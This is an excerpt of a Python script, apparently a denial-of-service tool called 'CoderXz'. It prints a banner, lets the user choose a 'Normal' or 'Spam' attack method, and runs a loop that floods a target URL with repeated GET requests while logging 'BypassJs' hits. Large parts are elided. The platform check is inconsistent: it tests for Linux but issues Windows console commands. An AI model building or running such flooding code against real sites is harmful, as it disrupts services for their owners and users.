...
def logo():
    if sys.platform.startswith("linux"):
        ...
        os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title CoderXzV1")
    print('''
   ____     ____     ______      _____   ______     __     __    ______  
  / ___)   / __ \   (_  __ \    / ___/  (   __ \   (_ \   / _)  (____  ) 
 / /      / /  \ \    ) ) \ \  ( (__     ) (__) )    \ \_/ /        / /  
( (      ( ()  () )  ( (   ) )  ) __)   (    __/      \   /     ___/ /_  
( (      ( ()  () )   ) )  ) ) ( (       ) \ \  _     / _ \    /__  ___) 
 \ \___   \ \__/ /   / /__/ /   \ \___  ( ( \ \_))  _/ / \ \_    / /____ 
  \____)   \____/   (______/     \____\  )_) \__/  (__/   \__)  (_______)
                                                     ''')
    try:
...
def choice_method_attack():
    ...
    print("|_--> 1:[ Normal ]")
    print("|_--> 2:[  Spam  ]")
    method_attack = input("[*] CoderXz [1/2]: ")
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                print("[+] CoderXz | BypassJs @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
                try:
                    for y in range(multiple):
                        http.request("GET", url,headers=headersx)
                except:
